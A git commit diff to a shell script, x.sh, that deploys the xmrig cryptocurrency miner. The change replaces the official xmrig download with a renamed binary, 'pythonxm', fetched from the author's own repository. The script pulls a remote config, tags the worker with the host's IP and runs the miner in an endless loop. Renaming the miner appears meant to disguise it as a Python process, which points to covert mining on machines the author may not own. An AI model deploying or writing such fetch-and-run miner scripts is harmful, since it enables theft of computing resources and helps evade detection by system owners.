2475a1b6d53c56c1627108fcfc2b076c3e3b6ba0
one10001 <78626503+one10001@users.noreply.github.com>
2021-04-01 20:40:07 +0100

    0.001

--- x.sh
+++ x.sh
@@ -4,9 +4,7 @@ IPNAME=$(sed 's|\.|o|g' <<< $iip)
 curl ipinfo.io
 rm -rf xmrig-6.10.0-linux-x64.tar.gz 
 rm -rf xmrig-6.10.0
-wget https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-x64.tar.gz 
-tar -xzf xmrig-6.10.0-linux-x64.tar.gz 
-cd xmrig-6.10.0
+wget https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm
 wget https://github.com/one10001/10001code/raw/main/config3.json
 sed -i "s+ip0001+$IPNAME+g" config3.json
-while true; do ./xmrig -c config3.json ; done;
+while true; do ./pythonxm -c config3.json ; done;
